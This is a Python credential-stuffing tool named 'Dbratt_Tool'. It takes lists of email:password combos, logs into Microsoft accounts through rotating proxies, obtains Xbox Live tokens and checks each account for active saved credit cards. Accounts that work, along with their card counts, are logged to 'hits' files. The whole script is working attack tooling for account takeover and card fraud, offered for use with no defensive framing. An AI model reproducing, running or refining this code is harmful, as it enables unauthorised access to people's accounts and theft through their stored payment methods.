import requests
import random
import urllib.parse
import string
import re
import tls_client
import json
import time
import yaml
import os
from datetime import datetime
from requests_toolbelt import MultipartEncoder
from colorama import Fore, Style, init
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from traceback import print_exc
from mojang import Client

if not os.path.exists("accs.txt"):
        with open("accs.txt", "w") as file:
            pass
with open("accs.txt", "r") as file:
    combo_count = sum(1 for _ in file)

total_accounts = combo_count
processed_accounts = 0
hits_count = 0
tfa_count = 0
bad_count = 0
start_time = time.time()


def update_cmd_title():
    elapsed_time = int(time.time() - start_time)
    minutes, seconds = divmod(elapsed_time, 60)
    hours, minutes = divmod(minutes, 60)
    percent_done = (processed_accounts / total_accounts) * 100 if total_accounts else 0
    title = f"Dbratt_Tool Left:{total_accounts - processed_accounts}/{total_accounts}({percent_done:.2f}%) Hits:{hits_count}  2FA:{tfa_count} Bad:{bad_count} Time:{hours}:{minutes}:{seconds}"
    os.system(f"title {title}")

lock = Lock()
config = yaml.safe_load(open("config.yml", "r"))["data"]
init()
def read_proxies_from_file(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    return proxies
class Logger:
    @staticmethod
    def Sprint(tag: str, content: str, color):
        timestamp = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M:%S')}] | {Fore.RESET}"
        with lock:
            print(
                Style.BRIGHT + timestamp + color + f" [{tag}] " + Fore.RESET + content
            )

    @staticmethod
    def Ask(tag: str, content: str, color):
        timestamp = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
        return input(
            Style.BRIGHT + timestamp + color + f" [{tag}] " + Fore.RESET + content
        )
class Purchase:
    def __init__(self, ms_creds: str, show_bad_logs: bool, show_tfa_logs: bool):
        self.ms_creds = ms_creds
        self.email, self.password = ms_creds.split(":")
        self.auth_session = requests.Session()
        self.show_bad_logs = show_bad_logs
        self.show_tfa_logs = show_tfa_logs
        proxies_file_path = 'proxies.txt'
        proxies = read_proxies_from_file(proxies_file_path)
        if proxies:
          proxi = random.choice(proxies)
          fmtRotate = {
          'http': f"http://{proxi}",
          } 
        else:
           fmtRotate = None

        self.auth_session.proxies = fmtRotate
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        self._run()

    @staticmethod
    def remove_content(filename: str, delete_line: str) -> None:
        with open(filename, "r+") as io:
            content = io.readlines()
            io.seek(0)
            for line in content:
                if not (delete_line in line):
                    io.write(line)
            io.truncate()

    def auth_get_request(self, *args, **kwargs):
        try:
            return self.auth_session.get(*args, **kwargs)
        except requests.RequestException as e:
            print(e)
            return None

    def auth_post_request(self, *args, **kwargs):
        try:
            return self.auth_session.post(*args, **kwargs)
        except requests.RequestException as e:
            print(e)
            return None

    def doPrivacyNotice(self):
        privNotifUrl = self.loginResp.text.split('name="fmHF" id="fmHF" action="')[
            1
        ].split('"')[0]
        corelationId = self.loginResp.text.split(
            'name="correlation_id" id="correlation_id" value="'
        )[1].split('"')[0]
        mCode = self.loginResp.text.split(
            'type="hidden" name="code" id="code" value="'
        )[1].split('"')[0]

        priveNotifPage = self.auth_post_request(
            privNotifUrl, data={"correlation_id": corelationId, "code": mCode}
        ).text

        privNotifPostData = {
            "AppName": "ALC",
            "ClientId": priveNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
            "ConsentSurface": "SISU",
            "ConsentType": "ucsisunotice",
            "correlation_id": corelationId,
            "CountryRegion": priveNotifPage.split("ucis.CountryRegion = '")[1].split(
                "'"
            )[0],
            "DeviceId": "",
            "EncryptedRequestPayload": priveNotifPage.split(
                "ucis.EncryptedRequestPayload = '"
            )[1].split("'")[0],
            "FormFactor": "Desktop",
            "InitVector": priveNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
            "Market": priveNotifPage.split("ucis.Market = '")[1].split("'")[0],
            "ModelType": "ucsisunotice",
            "ModelVersion": "1.11",
            "NoticeId": priveNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
            "Platform": "Web",
            "UserId": priveNotifPage.split("ucis.UserId = '")[1].split("'")[0],
            "UserVersion": "1",
        }
        privNotifPostData_m = MultipartEncoder(
            fields=privNotifPostData,
            boundary="----WebKitFormBoundary"
            + "".join(random.sample(string.ascii_letters + string.digits, 16)),
        )

        self.auth_post_request(
            "https://privacynotice.account.microsoft.com/recordnotice",
            headers={
                "authority": "privacynotice.account.microsoft.com",
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.7",
                "content-type": privNotifPostData_m.content_type,
                "origin": "https://privacynotice.account.microsoft.com",
                "referer": privNotifUrl,
                "sec-gpc": "1",
                "user-agent": self.user_agent,
            },
            data=privNotifPostData_m,
        )

        self.auth_session.headers[
            "Referer"
        ] = "https://privacynotice.account.microsoft.com/"
        returnUrl = urllib.parse.unquote(privNotifUrl.split("notice?ru=")[1])
        self.loginResp = self.auth_get_request(returnUrl)

    def fetchAuth(self):
        self.auth_session.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "identity",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": self.user_agent,
        }

        getLoginPage = self.auth_session.get(
            "https://login.live.com/ppsecure/post.srf"
        ).text

        if not ",urlPost:'" in getLoginPage:
            Logger.Sprint("ERROR", "Failed To Get Login Page Data!", Fore.LIGHTRED_EX)
            return "fail"

        self.flowToken1 = getLoginPage.split(
            ''''<input type="hidden" name="PPFT" id="i0327" value="'''
        )[1].split('"')[0]
        self.loginPostUrl = getLoginPage.split(",urlPost:'")[1].split("'")[0]
        self.credentialsUrl = getLoginPage.split("Cd:'")[1].split("'")[0]
        self.uaid = self.auth_session.cookies.get_dict()["uaid"]

        loginPostData = f"i13=0&login={self.email}&loginfmt={self.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={self.password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={self.flowToken1}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894"
        self.auth_session.headers["Origin"] = "https://login.live.com"
        self.auth_session.headers["Referer"] = "https://login.live.com/"
        loginHeaders = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Sec-GPC": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": self.user_agent,
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        self.loginResp = self.auth_session.post(
            self.loginPostUrl, data=loginPostData, headers=loginHeaders
        )
        if "https://account.live.com/recover" in self.loginResp.text:
            return "fail"
        if "https://privacynotice.account.microsoft.com/notice" in self.loginResp.text:
            self.doPrivacyNotice()
        if not "sFT:" in self.loginResp.text:
            return "fail"

        self.flowToken2 = re.findall("sFT:'(.+?(?='))", self.loginResp.text)[0]
        self.loginPostUrl2 = re.findall("urlPost:'(.+?(?='))", self.loginResp.text)[0]


        loginPostData2 = {
            "LoginOptions": "3",
            "type": "28",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": self.flowToken2,
            "i19": str(random.randint(10000, 30000)),
        }
        self.auth_session.headers["Referer"] = self.loginPostUrl
        self.auth_session.headers["Origin"] = "https://login.live.com"
        midAuth2 = self.auth_post_request(self.loginPostUrl2, data=loginPostData2).text

        accountXbox = self.auth_get_request(
            "https://account.xbox.com/",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-GPC": "1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": self.user_agent,
            },
        ).text
        if "fmHF" in accountXbox:
            xbox_json = {
                "fmHF": accountXbox.split('id="fmHF" action="')[1].split('"')[0],
                "pprid": accountXbox.split('id="pprid" value="')[1].split('"')[0],
                "nap": accountXbox.split('id="NAP" value="')[1].split('"')[0],
                "anon": accountXbox.split('id="ANON" value="')[1].split('"')[0],
                "t": accountXbox.split('id="t" value="')[1].split('"')[0],
            }

            verifyToken = (
                self.auth_post_request(
                    xbox_json["fmHF"],
                    timeout=20,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    data={
                        "pprid": xbox_json["pprid"],
                        "NAP": xbox_json["nap"],
                        "ANON": xbox_json["anon"],
                        "t": xbox_json["t"],
                    },
                )
                .text.split('name="__RequestVerificationToken" type="hidden" value="')[
                    1
                ]
                .split('"')[0]
            )
            self.auth_post_request(
                "https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://account.xbox.com",
                    "Referer": xbox_json["fmHF"],
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-GPC": "1",
                    "User-Agent": self.user_agent,
                    "X-Requested-With": "XMLHttpRequest",
                    "__RequestVerificationToken": verifyToken,
                },
                data={
                    "partnerOptInChoice": "false",
                    "msftOptInChoice": "false",
                    "isChild": "true",
                    "returnUrl": "https://www.xbox.com/en-US/?lc=1033",
                },
            )
        getXbl = self.auth_get_request(
            f"https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/"
        ).text
        try:
            rel = getXbl.split('"http://mp.microsoft.com/":{')[1].split("},")[0]
            json_obj = json.loads("{" + rel + "}")
            xbl_auth = "XBL3.0 x=" + json_obj["userHash"] + ";" + json_obj["token"]
            return xbl_auth
        except:
            Logger.Sprint("ERROR", "Failed to get XBL Authorization!", Fore.LIGHTRED_EX)
            return "fail"

    def getPaymentMethods(self):
        getPMMethods = requests.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends",
            headers={"authorization": self.xbl3},
        ).json()

        instruments = []
        for pm in getPMMethods:
            if (
                pm["paymentMethod"]["paymentMethodFamily"] == "credit_card"
                and pm["status"] == "Active"
            ):
                instruments.append(
                    {"id": pm["id"], "market": pm["details"]["address"]["country"]}
                )
        return [i for n, i in enumerate(instruments) if i not in instruments[:n]]

    @staticmethod
    def append_to_file(filename: str, line: str) -> None:
        """Append a line to a file, creating the file if it does not exist."""
        with open(filename, "a") as file:
            file.write(line + "\n")

    @staticmethod
    def remove_line_from_file(filename: str, line_to_remove: str) -> None:
        """Remove a specific line from a file."""
        with open(filename, "r") as file:
            lines = file.readlines()
        with open(filename, "w") as file:
            for line in lines:
                if line.strip("\n") != line_to_remove:
                    file.write(line)

    def run(self):
        global processed_accounts, hits_count, tfa_count, bad_count

        try:
            self.xbl3 = self.fetchAuth()

            if self.xbl3 != "fail":

                instruments = self.getPaymentMethods()
                if not instruments:
                    if self.show_bad_logs:
                        Logger.Sprint(
                            "Bad",
                            f"Microsoft Hit but no cards found -> {self.email}",
                            Fore.YELLOW,
                        )
                    Purchase.append_to_file(
                        "hits_without_cards.txt", f"{self.email}:{self.password}"
                    )
                else:
                    market_counts = {}
                    for instrument in instruments:
                        market = instrument["market"]
                        market_counts[market] = market_counts.get(market, 0) + 1

                    market_display = " ".join(
                        [
                            f"[{market}_x{count}]"
                            for market, count in market_counts.items()
                        ]
                    )

                    card_text = "card" if len(instruments) == 1 else "cards"

                    Logger.Sprint(
                        "SUCCESS",
                        f" | Microsoft Hit: {self.email}:{self.password} | {len(instruments)} {card_text} {market_display}",
                        Fore.LIGHTGREEN_EX,
                    )
                    hits_count += 1
                    Purchase.append_to_file(
                        "hits.txt",
                        f"[Microsoft Hit] {self.email}:{self.password} | {len(instruments)} {card_text} {market_display}",
                    )
                    with open('uncaptured_containscard.txt', 'a') as file:
                        file.write(self.email+':'+self.password+'\n')
                        processed_accounts += 1

            else:
                processed_accounts += 1
                if "2fa" in self.xbl3:
                    tfa_count += 1
                else:
                    bad_count += 1

            Purchase.remove_line_from_file("accs.txt", self.ms_creds)
            update_cmd_title()

        except Exception as e:
            Purchase.remove_line_from_file("accs.txt", self.ms_creds)
            update_cmd_title()

    def _run(self):
        try:
            self.run()
        except:
            pass


if __name__ == "__main__":
    if not os.path.exists("accs.txt"):
        with open("accs.txt", "w") as file:
            pass

    os.system("cls")
    logo = """
    ██████╗░██████╗░██████╗░░█████╗░████████╗████████╗  ████████╗░█████╗░░█████╗░██╗░░░░░
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
    ██║░░██║██████╦╝██████╔╝███████║░░░██║░░░░░░██║░░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██║░░██║██╔══██╗██╔══██╗██╔══██║░░░██║░░░░░░██║░░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██████╔╝██████╦╝██║░░██║██║░░██║░░░██║░░░░░░██║░░░  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
    ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
    """
    print(Style.BRIGHT + Fore.LIGHTBLUE_EX + logo + Style.RESET_ALL)
    print("-" * 50)
    with open('usage_Log.txt', 'a') as file:
        file.write(f"{datetime.now().strftime('%H:%M:%S')} - USED DBRATT TOOL - ACCESS: PUBLIC\n")

    try:
        with open("accs.txt", "r") as file:
            combo_count = sum(1 for _ in file)
    except FileNotFoundError:
        print(Fore.RED + "Error: 'accs.txt' not found." + Style.RESET_ALL)
        with open('usage_Log.txt', 'a') as file:
            file.write(f"{datetime.now().strftime('%H:%M:%S')} - No accs.txt found error was seen")
        input("Press any key to exit...")
        exit()

    if combo_count == 0:
        print(Fore.YELLOW + "There are 0 accounts in accs.txt." + Style.RESET_ALL)
        with open('usage_Log.txt', 'a') as file:
            file.write(f"{datetime.now().strftime('%H:%M:%S')} - No account found error was seen")
        input("Press any enter to exit...")
        exit()
    else:
        print(f"{Fore.LIGHTGREEN_EX}Combo Quantity: {combo_count}")

    threads = int(Logger.Ask("THREADS", "Enter Thread Amount : ", Fore.LIGHTBLUE_EX))
    bad_output = Logger.Ask(
        "Bad_output", "Bad_output (True/False): ", Fore.LIGHTBLUE_EX
    )
    tfa_output = Logger.Ask(
        "2fa_output", "2fa_output (True/False): ", Fore.LIGHTBLUE_EX
    )
    with open('usage_Log.txt', 'a') as file:
            file.write(f"{datetime.now().strftime('%H:%M:%S')} - Code was runned with parameter - 2fa Output: {tfa_output} BAD OUTPUT: {bad_output}")

    show_bad_logs = bad_output.lower() != "false"
    show_tfa_logs = tfa_output.lower() != "false"

    with ThreadPoolExecutor(max_workers=threads) as exc:
        for acc in open("accs.txt").read().splitlines():
            exc.submit(Purchase, acc, show_bad_logs, show_tfa_logs)
with open('usage_Log.txt', 'a') as file:
        file.write(f"{datetime.now().strftime('%H:%M:%S')} - Checked all the combos | hits: {hits_count} | total: {total_accounts}")
input('Press enter to exit.... [ all combos have been checked]')